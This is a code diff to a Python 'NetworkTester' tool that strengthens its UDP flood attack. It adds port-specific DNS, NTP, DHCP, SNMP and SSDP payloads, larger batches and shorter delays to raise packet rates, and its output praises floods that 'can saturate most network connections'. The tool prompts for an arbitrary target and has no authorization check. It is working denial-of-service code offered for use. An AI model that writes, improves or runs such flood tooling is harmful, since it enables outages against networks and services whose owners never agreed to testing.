@@ -246,12 +246,12 @@ class NetworkTester:
         success_rate = (self.stats['successful_requests'] / max(1, self.stats['total_requests'])) * 100
         
         # Clear the line and print stats
-        print(f"\r📊 Requests: {self.stats['total_requests']} | "
-              f"✅ Success: {self.stats['successful_requests']} | "
+        print(f"\r📊 Packets: {self.stats['total_requests']} | "
+              f"✅ Sent: {self.stats['successful_requests']} | "
               f"❌ Failed: {self.stats['failed_requests']} | "
-              f"📈 Success Rate: {success_rate:.1f}% | "
-              f"⚡ RPS: {self.stats['current_rps']:.1f} | "
-              f"🔥 Peak RPS: {self.stats['peak_rps']:.1f} | "
+              f"📈 Send Rate: {success_rate:.1f}% | "
+              f"⚡ PPS: {self.stats['current_rps']:.1f} | "
+              f"🔥 Peak PPS: {self.stats['peak_rps']:.1f} | "
               f"⏱️ Time: {elapsed:.1f}s", end='', flush=True)
 
     async def layer7_attack(self, url: str, num_requests: int, concurrency: int, 
@@ -413,28 +413,86 @@ class NetworkTester:
 
     async def layer4_udp_attack(self, host: str, port: int, num_packets: int, 
                                concurrency: int, packet_size: int = 1024):
-        """Enhanced Layer 4 UDP flood attack"""
+        """Enhanced Layer 4 UDP flood attack with smart payloads"""
         print(f"\n🚀 Starting Enhanced Layer 4 UDP attack on {host}:{port}")
         print(f"📋 Packets: {num_packets} | Concurrency: {concurrency} | Packet Size: {packet_size} bytes")
         
         self.stats['start_time'] = time.time()
         semaphore = asyncio.Semaphore(concurrency)
         
-        # Create multiple payload types for better effectiveness
-        payloads = [
-            # Random data payload
-            os.urandom(packet_size),
-            # DNS query-like payload (for port 53)
-            b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01',
-            # NTP request-like payload (for port 123)
-            b'\x1b' + b'\x00' * 47,
-            # DHCP discover-like payload (for port 67/68)
-            b'\x01\x01\x06\x00' + os.urandom(236),
-            # SNMP get-request-like payload (for port 161)
-            b'\x30\x26\x02\x01\x00\x04\x06public\xa0\x19\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00',
-            # Amplified payload (larger size)
-            b'A' * packet_size
-        ]
+        # Create service-specific payloads for better effectiveness
+        def get_payload_for_port(port: int, size: int) -> bytes:
+            """Generate appropriate payload based on target port"""
+            if port == 53:  # DNS
+                # DNS query for example.com
+                dns_query = (
+                    b'\x12\x34'  # Transaction ID
+                    b'\x01\x00'  # Flags (standard query)
+                    b'\x00\x01'  # Questions: 1
+                    b'\x00\x00'  # Answer RRs: 0
+                    b'\x00\x00'  # Authority RRs: 0
+                    b'\x00\x00'  # Additional RRs: 0
+                    b'\x07example\x03com\x00'  # Query: example.com
+                    b'\x00\x01'  # Type: A
+                    b'\x00\x01'  # Class: IN
+                )
+                return dns_query + b'\x00' * max(0, size - len(dns_query))
+                
+            elif port == 123:  # NTP
+                # NTP request packet
+                ntp_packet = b'\x1b' + b'\x00' * 47
+                return ntp_packet + b'\x00' * max(0, size - len(ntp_packet))
+                
+            elif port in [67, 68]:  # DHCP
+                # DHCP discover packet
+                dhcp_packet = (
+                    b'\x01'  # Message type: Boot Request
+                    b'\x01'  # Hardware type: Ethernet
+                    b'\x06'  # Hardware address length
+                    b'\x00'  # Hops
+                    + os.urandom(4)  # Transaction ID
+                    + b'\x00\x00'  # Seconds elapsed
+                    + b'\x00\x00'  # Bootp flags
+                    + b'\x00' * 16  # Client/Your/Server/Gateway IP addresses
+                    + os.urandom(16)  # Client hardware address + padding
+                    + b'\x00' * 192  # Server host name + boot file name
+                    + b'\x63\x82\x53\x63'  # Magic cookie
+                    + b'\x35\x01\x01'  # DHCP Message Type: Discover
+                    + b'\xff'  # End option
+                )
+                return dhcp_packet + b'\x00' * max(0, size - len(dhcp_packet))
+                
+            elif port == 161:  # SNMP
+                # SNMP get-request
+                snmp_packet = (
+                    b'\x30\x26'  # SEQUENCE
+                    b'\x02\x01\x00'  # Version: 1
+                    b'\x04\x06public'  # Community: public
+                    b'\xa0\x19'  # Get-request PDU
+                    b'\x02\x01\x00'  # Request ID
+                    b'\x02\x01\x00'  # Error status
+                    b'\x02\x01\x00'  # Error index
+                    b'\x30\x0b'  # Variable bindings
+                    b'\x30\x09'  # Variable binding
+                    b'\x06\x05\x2b\x06\x01\x02\x01'  # OID: 1.3.6.1.2.1
+                    b'\x05\x00'  # NULL value
+                )
+                return snmp_packet + b'\x00' * max(0, size - len(snmp_packet))
+                
+            elif port == 1900:  # UPnP/SSDP
+                # SSDP M-SEARCH request
+                ssdp_request = (
+                    b'M-SEARCH * HTTP/1.1\r\n'
+                    b'HOST: 239.255.255.250:1900\r\n'
+                    b'MAN: "ssdp:discover"\r\n'
+                    b'ST: upnp:rootdevice\r\n'
+                    b'MX: 3\r\n\r\n'
+                )
+                return ssdp_request + b'\x00' * max(0, size - len(ssdp_request))
+                
+            else:
+                # Generic high-entropy payload for other ports
+                return os.urandom(size)
         
         async def send_udp_packet(packet_id):
             async with semaphore:
@@ -446,30 +504,21 @@ class NetworkTester:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     sock.setblocking(False)
                     
-                    # Select payload based on port or random
-                    if port == 53:  # DNS
-                        payload = payloads[1]
-                    elif port == 123:  # NTP
-                        payload = payloads[2]
-                    elif port in [67, 68]:  # DHCP
-                        payload = payloads[3]
-                    elif port == 161:  # SNMP
-                        payload = payloads[4]
-                    else:
-                        # Use random payload or large payload
-                        payload = random.choice([payloads[0], payloads[5]])
+                    # Get appropriate payload for the target port
+                    payload = get_payload_for_port(port, packet_size)
                     
                     # Send packet
                     await asyncio.get_event_loop().sock_sendto(sock, payload, (host, port))
                     sock.close()
                     
+                    # For UDP, we consider the packet "sent successfully" if no exception occurred
                     self.update_stats(True)
                     
                 except Exception:
                     self.update_stats(False)
 
-        # Create tasks in batches for better performance
-        batch_size = min(2000, concurrency * 20)  # Larger batches for UDP
+        # Create tasks in larger batches for UDP (more efficient)
+        batch_size = min(5000, concurrency * 50)  # Much larger batches for UDP
         
         for batch_start in range(0, num_packets, batch_size):
             if not self.running:
@@ -491,10 +540,10 @@ class NetworkTester:
             # Print stats after each batch
             self.print_stats()
             
-            # Smaller delay for UDP (faster sending)
-            await asyncio.sleep(0.05)
+            # Very small delay for UDP (maximize speed)
+            await asyncio.sleep(0.01)
             
-        print(f"\n✅ Layer 4 UDP attack completed!")
+        print(f"\n✅ Enhanced Layer 4 UDP attack completed!")
 
     def signal_handler(self, signum, frame):
         """Handle Ctrl+C gracefully"""
@@ -619,21 +668,21 @@ def main():
             # Display parsed information
             tester.display_target_info(host, port, scheme)
             
-            # Suggest UDP ports
+            # Suggest UDP ports with descriptions
             print(f"\n💡 Common UDP ports for testing:")
             udp_ports = {
-                53: "DNS",
-                123: "NTP", 
-                161: "SNMP",
-                67: "DHCP Server",
-                68: "DHCP Client",
-                69: "TFTP",
-                514: "Syslog",
-                1900: "UPnP"
+                53: "DNS - Domain Name System",
+                123: "NTP - Network Time Protocol", 
+                161: "SNMP - Simple Network Management Protocol",
+                67: "DHCP Server - Dynamic Host Configuration",
+                68: "DHCP Client - Dynamic Host Configuration",
+                69: "TFTP - Trivial File Transfer Protocol",
+                514: "Syslog - System Logging",
+                1900: "UPnP/SSDP - Universal Plug and Play"
             }
             
-            for udp_port, service in udp_ports.items():
-                print(f"   {udp_port}: {service}")
+            for udp_port, description in udp_ports.items():
+                print(f"   {udp_port}: {description}")
             
             # Ask if user wants to change the port
             change_port = input(f"\n🔧 Current port is {port}. Change it? (y/n): ").strip().lower()
@@ -645,7 +694,7 @@ def main():
                     
                     # Show what service this port typically runs
                     if port in udp_ports:
-                        print(f"🎯 Targeting {udp_ports[port]} service")
+                        print(f"🎯 Targeting {udp_ports[port]}")
                 
             num_packets = int(input("📊 Enter number of packets: "))
             concurrency = int(input("⚡ Enter concurrency level: "))
@@ -706,28 +755,46 @@ def main():
     # Final stats
     if tester.stats['total_requests'] > 0:
         print(f"\n\n📈 Final Statistics:")
-        print(f"   Total Requests/Connections: {tester.stats['total_requests']}")
-        print(f"   Successful: {tester.stats['successful_requests']}")
-        print(f"   Failed: {tester.stats['failed_requests']}")
-        success_rate = (tester.stats['successful_requests'] / tester.stats['total_requests']) * 100
-        print(f"   Success Rate: {success_rate:.1f}%")
-        print(f"   Peak RPS: {tester.stats['peak_rps']:.1f}")
+        print(f"   Total Packets Sent: {tester.stats['total_requests']}")
+        print(f"   Successfully Transmitted: {tester.stats['successful_requests']}")
+        print(f"   Failed to Send: {tester.stats['failed_requests']}")
+        send_rate = (tester.stats['successful_requests'] / tester.stats['total_requests']) * 100
+        print(f"   Transmission Rate: {send_rate:.1f}%")
+        print(f"   Peak PPS (Packets Per Second): {tester.stats['peak_rps']:.1f}")
         elapsed = time.time() - tester.stats['start_time']
         print(f"   Total Time: {elapsed:.1f} seconds")
         
-        # Explain what happened
-        print(f"\n💡 Analysis:")
+        # Enhanced analysis for UDP attacks
+        print(f"\n💡 UDP Attack Analysis:")
         if tester.stats['successful_requests'] > 0:
-            print(f"   ✅ Successfully sent {tester.stats['successful_requests']} UDP packets")
+            print(f"   ✅ Successfully transmitted {tester.stats['successful_requests']} UDP packets")
             print(f"   📊 This demonstrates high-volume packet transmission capability")
-            if tester.stats['peak_rps'] > 1000:
-                print(f"   🔥 Excellent RPS achieved - very effective UDP flood")
+            
+            # Performance analysis
+            if tester.stats['peak_rps'] > 5000:
+                print(f"   🔥 Excellent PPS achieved - very effective UDP flood")
+                print(f"   💥 This rate can saturate most network connections")
+            elif tester.stats['peak_rps'] > 1000:
+                print(f"   ⚡ Good PPS achieved - effective network stress test")
+                print(f"   📈 This rate can impact target service performance")
             elif tester.stats['peak_rps'] > 100:
-                print(f"   ⚡ Good RPS achieved - effective network stress test")
+                print(f"   📊 Moderate PPS achieved - basic stress testing")
+                print(f"   🎯 Suitable for testing service resilience")
             else:
-                print(f"   ⚠️ Low RPS - may be limited by network or system resources")
+                print(f"   ⚠️ Low PPS - may be limited by network or system resources")
+                print(f"   💡 Try increasing concurrency or reducing packet size")
+            
+            # UDP-specific notes
+            print(f"\n📝 UDP Attack Notes:")
+            print(f"   • UDP is connectionless - packets are sent without delivery confirmation")
+            print(f"   • High transmission rate indicates successful packet generation and sending")
+            print(f"   • Target may drop packets due to rate limiting or filtering")
+            print(f"   • Effective for testing network capacity and service resilience")
+            
         else:
-            print(f"   ❌ No packets sent successfully - check network connectivity")
+            print(f"   ❌ No packets transmitted successfully")
+            print(f"   🔧 Check network connectivity and firewall settings")
+            print(f"   💡 Try different target ports or reduce concurrency")
 
 if __name__ == "__main__":
     main()
